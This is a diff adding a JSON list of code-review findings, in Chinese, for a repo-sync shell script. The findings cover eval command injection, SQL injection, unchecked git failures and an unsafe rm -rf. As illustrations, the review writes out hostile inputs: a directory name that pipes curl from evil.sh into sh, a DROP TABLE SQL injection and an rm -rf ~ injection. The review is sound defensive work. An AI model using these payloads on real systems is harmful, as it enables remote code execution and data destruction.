@@ -1,0 +1,79 @@
+[
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 56,
+    "side": "RIGHT",
+    "severity": "blocker",
+    "confidence": 0.95,
+    "title": "eval 執行未受信任的 hook 參數，存在命令注入風險",
+    "body": "`run_hook` 使用 `eval \"$hook $repo\"` 執行 hook。`$repo` 來自 `basename \"$dir\"`，而 `$dir` 來自 `ls \"$ROOT\"` 的輸出。如果 repo 目錄名稱包含 shell 特殊字元（例如 `$(malicious)` 或 `; rm -rf ~`），這些字元會被 eval 解釋並執行，導致任意命令執行。\n\n**失敗情境**：攻擊者在 `$ROOT` 下建立一個名為 `$(curl http://evil.sh | sh)` 的目錄，且該目錄包含 `.git` 子目錄，腳本執行到 `run_hook` 時就會下載並執行惡意腳本。\n\n**建議**：避免使用 eval，改為直接執行：`\"$hook\" \"$repo\"`。若 hook 需要 shell 解析參數，應改用陣列傳遞或明確限制 repo 名稱格式。",
+    "existing_code": "eval \"$hook $repo\"",
+    "evidence": "diff 第 51 行：`eval \"$hook $repo\"`，其中 `$repo` 來自 `basename \"$dir\"`，而 `$dir` 來自 `ls \"$ROOT\"` 的輸出，未經任何 sanitization。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 47,
+    "side": "RIGHT",
+    "severity": "blocker",
+    "confidence": 0.9,
+    "title": "SQL 注入風險：repo 名稱與 branch 未經跳脫直接插入 SQL",
+    "body": "`sqlite3 \"$DB\" \"INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, datetime('now'))\"` 中，`$name` 和 `$BRANCH` 直接拼接進 SQL 字串。雖然 `$BRANCH` 有正規表示式驗證，但 `$name` 完全未驗證。如果 repo 目錄名稱包含單引號（例如 `test'repo`），會破壞 SQL 語法或注入惡意 SQL。\n\n**失敗情境**：建立一個名為 `x'); DROP TABLE runs;--` 的 repo 目錄，執行腳本後 runs 表會被刪除。\n\n**建議**：使用參數化查詢（sqlite3 支援 `?` 佔位符）或對所有插入值進行跳脫（例如將 `'` 替換為 `''`）。",
+    "existing_code": "sqlite3 \"$DB\" \"INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, datetime('now'))\"",
+    "evidence": "diff 第 43 行：直接將 `$name` 和 `$BRANCH` 插入 SQL 字串，未使用參數化或跳脫。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 34,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.85,
+    "title": "git 指令失敗未中止，可能導致錯誤結果寫入資料庫",
+    "body": "`git fetch`、`git checkout`、`git merge` 的 stderr 被重定向到 log，但 exit code 未檢查。若 fetch 失敗（例如網路問題），後續 checkout 和 merge 可能基於過時的遠端分支，導致 `ahead` 計算錯誤，並將錯誤結果寫入資料庫。\n\n**失敗情境**：網路中斷時，`git fetch` 失敗，但腳本繼續執行，`git merge --ff-only` 可能因遠端分支不存在而失敗，但 `ahead` 仍會計算（可能為空或錯誤），最終將不正確的資料寫入 runs 表。\n\n**建議**：在每個 git 指令後檢查 exit code，失敗時記錄錯誤並跳過該 repo（或中止整個腳本）。",
+    "existing_code": "git fetch origin --prune 2>>\"$LOG\"\n\n  # branch 已在開頭驗過格式，可以直接用\n  git checkout $BRANCH 2>>\"$LOG\"\n  git merge --ff-only \"origin/$BRANCH\" 2>>\"$LOG\"",
+    "evidence": "diff 第 33-37 行：git 指令的 stderr 被重定向，但未檢查 exit code。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 41,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.8,
+    "title": "ahead 變數可能為空，導致 SQL 語法錯誤",
+    "body": "`ahead=$(git rev-list --count \"origin/$BRANCH\"..HEAD 2>/dev/null)` 若 git rev-list 失敗（例如 origin/$BRANCH 不存在），`ahead` 會是空字串。後續 SQL 插入 `$ahead` 時會產生 `INSERT INTO runs VALUES('repo', 'branch', , datetime('now'))`，導致 SQL 錯誤。\n\n**失敗情境**：若 `git fetch` 未成功取得遠端分支，`origin/$BRANCH` 不存在，`git rev-list` 失敗，`ahead` 為空，SQL 插入失敗。\n\n**建議**：在計算 ahead 後檢查是否為空，若為空則設定為 0 或跳過該 repo。",
+    "existing_code": "ahead=$(git rev-list --count \"origin/$BRANCH\"..HEAD 2>/dev/null)",
+    "evidence": "diff 第 40 行：`ahead` 可能為空，未做預設值處理。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 37,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.75,
+    "title": "git checkout 未加引號，branch 名稱可能被 shell 展開",
+    "body": "`git checkout $BRANCH` 中 `$BRANCH` 未加引號。雖然前面有正規表示式驗證，但若 branch 名稱包含 glob 字元（例如 `*`）或空格（雖然正規表示式不允許空格），仍可能被 shell 展開或分割。\n\n**失敗情境**：若 branch 名稱包含 `*`（例如 `feature/*`），shell 會嘗試展開為符合的檔案名稱，可能導致 checkout 錯誤的分支。\n\n**建議**：將 `$BRANCH` 加上雙引號：`git checkout \"$BRANCH\"`。",
+    "existing_code": "git checkout $BRANCH 2>>\"$LOG\"",
+    "evidence": "diff 第 34 行：`$BRANCH` 未加引號。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 62,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.7,
+    "title": "cleanup_cache 使用 rm -rf 刪除目錄內容，若 ROOT 未正確設定可能造成災難性刪除",
+    "body": "`rm -rf \"$ROOT\"/.cache/*` 若 `$ROOT` 為空或未設定，會變成 `rm -rf /.cache/*`，可能刪除系統檔案。雖然 main 中有檢查 `$BRANCH`，但未檢查 `$ROOT` 是否為空。\n\n**失敗情境**：使用者執行 `./repo_sync.sh \"\" main`，`$ROOT` 為空，`rm -rf /.cache/*` 會嘗試刪除根目錄下的 .cache 內容。\n\n**建議**：在 main 中檢查 `$ROOT` 是否為空，並確保 `$ROOT` 是絕對路徑或至少非空。",
+    "existing_code": "rm -rf \"$ROOT\"/.cache/*",
+    "evidence": "diff 第 58 行：`rm -rf \"$ROOT\"/.cache/*`，未檢查 `$ROOT` 是否為空。"
+  },
+  {
+    "path": "sandbox/repo_sync.sh",
+    "line": 68,
+    "side": "RIGHT",
+    "severity": "minor",
+    "confidence": 0.6,
+    "title": "summarize 中 total 計算可能因 grep 失敗而錯誤",
+    "body": "`total=$(grep -c . \"$LOG\" 2>/dev/null) || total=0` 若 grep 因檔案不存在而失敗，`total` 會被設為 0，但若 grep 因其他原因失敗（例如權限問題），也會被設為 0，可能隱藏錯誤。\n\n**建議**：分開處理檔案不存在與其他錯誤，或使用 `wc -l` 替代。",
+    "existing_code": "total=$(grep -c . \"$LOG\" 2>/dev/null) || total=0",
+    "evidence": "diff 第 69 行：`|| total=0` 會將所有 grep 失敗都視為 0。"
+  }
+]
